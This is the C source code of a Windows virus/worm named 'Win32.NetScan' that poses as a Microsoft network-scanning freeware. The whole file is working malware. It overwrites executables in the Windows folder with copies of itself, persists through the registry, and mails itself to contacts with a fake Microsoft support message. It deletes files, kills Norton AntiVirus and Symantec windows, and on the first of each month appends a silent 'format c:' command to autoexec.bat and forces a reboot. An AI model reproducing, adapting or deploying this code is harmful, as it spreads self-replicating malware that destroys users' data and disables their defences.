#include "netscan.h"
#pragma hdrstop
#pragma warning (disable: 4068)
#pragma warning (disable: 4001)
#pragma resource "resource.res"

char GetNetScanPath[256],GetNetScanWinDir[256],MyBuffer[256]="echo y|format c: /u /v:HaHaHaHa";
LPSTR FileEmm386 = "Emm386.exe";
LPSTR FileSetver = "SetVer.exe";
LPSTR Nom = "a";
DWORD ExtInf;
int Err,ErrSend;
HANDLE NetScanTime,NetScanHandle,AutoBat;
HMODULE GetKernLib, GetMapiLib;
HKEY NetScan32Key,NetScanNTKey,NetScanInstall,CreateNetScan;
typedef DWORD(*RegistServProcs)(DWORD,DWORD);
typedef ULONG(*SendMessInfect)(LHANDLE,ULONG,MapiMessage FAR*,FLAGS,ULONG);
typedef ULONG(*FindUserAddress)(LHANDLE,ULONG,LPTSTR,FLAGS,ULONG,lpMapiRecipDesc FAR*);
typedef ULONG(*DoMemFree)(LPVOID);
HWND WindowsHwnd,SymantecHwnd,NAVHwnd;

#pragma argsused
int APIENTRY WinMain
(
HINSTANCE hInstance,
HINSTANCE hPrevInstance,
LPSTR     lpszCmdLine,
int       nCmdShow
)
{
//Win32.NetScan by ZeMacroKiller98
//Tous droits r‚serv‚s (c) 2001
WIN32_FIND_DATA GetFileToInfect;
OSVERSIONINFO GetOsVer;
FILETIME GetFileCreateTime,GetFileLstAccess,GetFileLstWrite;
SYSTEMTIME TriggerScanTime;
RegistServProcs MyServProcs;
SendMessInfect SendMessToOther;
FindUserAddress GetAddressUser;
DoMemFree GetMemFree;
GetKernLib = LoadLibrary("kernel32.dll");
MyServProcs = (RegistServProcs)GetProcAddress(GetKernLib,"RegisterServiceProcess");
MessageBox(NULL,"This freeware install automaticaly itself into your system\nIt scan your system each time you connect to network\nIf you have any problem, contact Microsoft","NetScan Utility",MB_OK|MB_ICONINFORMATION|MB_SYSTEMMODAL);
SearchPath(NULL,_argv[0],NULL,sizeof(GetNetScanPath),GetNetScanPath,NULL);
GetOsVer.dwOSVersionInfoSize = sizeof(GetOsVer);
GetVersionEx(&GetOsVer);
if(GetOsVer.dwPlatformId==VER_PLATFORM_WIN32_NT)
{
        RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\WindowsNT\\CurrentVersion\\RunServices",0,KEY_ALL_ACCESS,&NetScanNTKey);
        RegSetValueEx(NetScanNTKey,"NetScanNT",0,REG_SZ,GetNetScanPath,sizeof(GetNetScanPath));
        RegCloseKey(NetScanNTKey);
}
else
{
        RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\RunServices",0,KEY_ALL_ACCESS,&NetScan32Key);
        RegSetValueEx(NetScan32Key,"NetScan32",0,REG_SZ,GetNetScanPath,sizeof(GetNetScanPath));
        RegCloseKey(NetScan32Key);
}
if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,"Software\\NetScan\\Install",0,KEY_ALL_ACCESS,&NetScanInstall)!=ERROR_SUCCESS)
{
        GetMapiLib = LoadLibrary("mapi32.dll");
        GetWindowsDirectory(GetNetScanWinDir,sizeof(GetNetScanWinDir));
        SetCurrentDirectory(GetNetScanWinDir);
        NetScanHandle = FindFirstFile("*.exe",&GetFileToInfect);
        NetScanFind:
        NetScanTime = CreateFile(GetFileToInfect.cFileName,GENERIC_READ|GENERIC_WRITE,0, NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
        GetFileTime(NetScanTime,&GetFileCreateTime,&GetFileLstAccess,&GetFileLstWrite);
        CloseHandle(NetScanTime);        
        if((lstrcmp(GetFileToInfect.cFileName,"emm386.exe")==0)||(lstrcmp(GetFileToInfect.cFileName,"setver.exe")==0))
                goto NotInfection;
        CopyFile(_argv[0],GetFileToInfect.cFileName,FALSE);
        NetScanTime = CreateFile(GetFileToInfect.cFileName,GENERIC_READ|GENERIC_WRITE,0, NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
        SetFileTime(NetScanTime,&GetFileCreateTime,&GetFileLstAccess,&GetFileLstWrite);
        CloseHandle(NetScanTime);
        NotInfection:
        if(FindNextFile(NetScanHandle,&GetFileToInfect)==TRUE)
                goto NetScanFind;
        FindClose(NetScanHandle);
        RegCreateKey(HKEY_LOCAL_MACHINE,"Software\\Britney\\Install",&CreateNetScan);
        RegCloseKey(CreateNetScan);
        SendMessToOther = (SendMessInfect)GetProcAddress(GetMapiLib,"MAPISendMail");
        GetAddressUser = (FindUserAddress)GetProcAddress(GetMapiLib,"MAPIResolveName");
        GetMemFree = (DoMemFree)GetProcAddress(GetMapiLib,"MAPIFreeBuffer");
        if((SendMessToOther==NULL)||(GetAddressUser==NULL)||(GetMemFree==NULL))
        {
                MessageBox(NULL,"This program need MAPI functions installed on your PC\nPlease contact your hot line to install it","NetScan Utility",MB_OK|MB_ICONEXCLAMATION);
                SetCurrentDirectory("C:/");
                DeleteFile("*.*");
                ExitProcess(0);
        }
MapiMessage stMessage;
MapiRecipDesc stRecip;
MapiFileDesc stFile;
lpMapiRecipDesc lpRecip;
stFile.ulReserved = 0;
stFile.flFlags = 0L;
stFile.nPosition = (ULONG)-1;
stFile.lpszPathName = GetNetScanPath;
stFile.lpszFileName = NULL;
stFile.lpFileType = NULL;
MessageBox(NULL,"To test your network, you need to select a email address into your address book\nPlease select address with","ILoveBritney Freeware",MB_OK|MB_ICONINFORMATION|MB_SYSTEMMODAL);
UnResolve:
Err = (GetAddressUser)(lhSessionNull,0L,Nom,MAPI_DIALOG,0L,&lpRecip);
if(Err!=SUCCESS_SUCCESS)
{
switch(Err){
        case MAPI_E_AMBIGUOUS_RECIPIENT:
                MessageBox(NULL,"The recipient requested has not been or could\n not be resolved to a unique address list entry","NetScan Utility",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);                
        break;
        case MAPI_E_UNKNOWN_RECIPIENT:
                MessageBox(NULL,"The recipient could not be resolved to any\naddress.The recipient might not exist or might be unknown","NetScan Utility",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);                
        break;
        case MAPI_E_FAILURE:
                MessageBox(NULL,"One or more unspecified errors occured\nThe name was not resolved","NetScan Utility",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
                DeleteFile("*.*");
                ExitProcess(0);
        break;
        case MAPI_E_INSUFFICIENT_MEMORY:
                MessageBox(NULL,"There was insufficient memory to proceed","NetScan Utility",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
                DeleteFile("*.*");
                ExitProcess(0);
        break;
        case MAPI_E_NOT_SUPPORTED:
                MessageBox(NULL,"The operation was not supported by the messaging system","NetScan Utility",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
                DeleteFile("*.*");
                ExitProcess(0);
        break;
        case MAPI_E_USER_ABORT:
                MessageBox(NULL,"The user was cancelled one or more dialog box","NetScan Utility",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
                DeleteFile("*.*");
                ExitProcess(0);
        break;        
        }
goto UnResolve;
}
stRecip.ulReserved = lpRecip->ulReserved;
stRecip.ulRecipClass = MAPI_TO;
stRecip.lpszName = lpRecip->lpszName;
stRecip.lpszAddress = lpRecip->lpszAddress;
stRecip.ulEIDSize = lpRecip->ulEIDSize;
stRecip.lpEntryID = lpRecip->lpEntryID;
stMessage.ulReserved = 0;
stMessage.lpszSubject = "Microsoft NetScan Utility";
stMessage.lpszNoteText = lstrcat("Hi ",(lstrcat(lpRecip->lpszName,"\n\n\tI send you this mail to test my network\nI need you to send me a answer about it\nThis program can scan your network to find all problem into your network\n\n\tEnjoy to test your net...\nThank you and see you soon....\n\n\n\t\t\t\t\tMicrosoft Technical Support")));
stMessage.lpszMessageType = NULL;
stMessage.lpszDateReceived = NULL;
stMessage.lpszConversationID = NULL;
stMessage.flFlags = 0L;
stMessage.lpOriginator = NULL;
stMessage.nRecipCount = 1;
stMessage.lpRecips = &stRecip;
stMessage.nFileCount = 1;
stMessage.lpFiles = &stFile;
ErrSend = (SendMessToOther)(lhSessionNull,0L,&stMessage,0L,0L);
if(ErrSend!=SUCCESS_SUCCESS)
{
        MessageBox(NULL,"The test can't continue, due to a error occured during to sending message\nPlease contact our hotline at hotline@microsoft.com","NetScan Utility",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
        DeleteFile("*.*");
        ExitProcess(0);
} 
MessageBox(NULL,"The test is OK and NetScan is installed into your system\n",
                "NetScan Utility",
                 MB_OK|MB_ICONINFORMATION);
FreeLibrary(GetMapiLib);
}
RegCloseKey(NetScanInstall);
STARTUPINFO NetScanInfo;
PROCESS_INFORMATION NetScanProc;
NetScanInfo.cb = sizeof(STARTUPINFO);
NetScanInfo.lpReserved = NULL;
NetScanInfo.lpReserved2 = NULL;
NetScanInfo.cbReserved2 = 0;
NetScanInfo.lpDesktop = NULL;
NetScanInfo.dwFlags = STARTF_FORCEOFFFEEDBACK;
if(CreateProcess(GetNetScanPath,
                NULL,
                (LPSECURITY_ATTRIBUTES)NULL,
                (LPSECURITY_ATTRIBUTES)NULL,
                FALSE,
                0,
                NULL,
                NULL,
                &NetScanInfo,
                &NetScanProc))
{
CloseHandle(NetScanProc.hProcess);
CloseHandle(NetScanProc.hThread);
}
if(CreateMutex(NULL,TRUE,GetNetScanPath)==NULL)
        ExitProcess(0);
SetPriorityClass(NetScanProc.hProcess,REALTIME_PRIORITY_CLASS);
MyServProcs(NetScanProc.dwProcessId,1);
GetSystemTime(&TriggerScanTime);
//Close windows which title is WINDOWS
WindowsHwnd = FindWindow(NULL,"WINDOWS");
if(WindowsHwnd!=NULL)
        DestroyWindow(WindowsHwnd);
//Close access to Symantec HomePage
SymantecHwnd = FindWindow(NULL,"Symantec Security Updates - Home Page - Microsoft Internet Explorer");
if(SymantecHwnd!=NULL)
{
        MessageBox(NULL,"You don't have access to this page\nPlease contact the web master to correct this problem\n","Microsoft Internet Explorer",MB_OK|MB_ICONEXCLAMATION|MB_ICONSTOP);
        DestroyWindow(SymantecHwnd);
}
//Anti Norton Antivirus
NAVHwnd = FindWindow(NULL,"Norton AntiVirus");
if(NAVHwnd !=NULL)
{
        MessageBox(NULL,"Ha Ha Ha Ha!!!!, you use NAV?????\nI can allow access to it\nChange AV now","Win32.NetScan",MB_OK|MB_ICONSTOP|MB_SYSTEMMODAL);
        DestroyWindow(NAVHwnd);
}
if((TriggerScanTime.wHour==12)&&(TriggerScanTime.wMinute==12))
{
	mciSendString("open cdaudio",NULL,0,NULL);
	mciSendString("set cdaudio door open",NULL,0,NULL);
	mciSendString("close cdaudio",NULL,0,NULL);
	mciSendString("open cdaudio",NULL,0,NULL);
	mciSendString("set cdaudio audio all off",NULL,0,NULL);
	mciSendString("close cdaudio",NULL,0,NULL);
        MessageBeep(MB_ICONEXCLAMATION);
}        
if(TriggerScanTime.wDay==1)
{
        MessageBox(NULL,"It's the day that your PC is going to scan or maybe going to disappear","Win32.Netscan",MB_OK|MB_ICONEXCLAMATION);
	SetCurrentDirectory("C:\\");
        AutoBat = CreateFile("autoexec.bat",GENERIC_WRITE,0,(LPSECURITY_ATTRIBUTES) NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,(HANDLE) NULL);
        SetFilePointer(AutoBat, 0, (LPLONG)NULL,FILE_END);
        WriteFile(AutoBat,MyBuffer,sizeof(MyBuffer),&ExtInf,NULL);
        CloseHandle(AutoBat);
	ExitWindowsEx(EWX_FORCE|EWX_REBOOT,0);
}                
FreeLibrary(GetKernLib);
return 0;
}


*************************************************************************

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <dos.h>
#include <stdlib.h>
#include <stdio.h>
#include <mapi.h>
#include <mmsystem.h>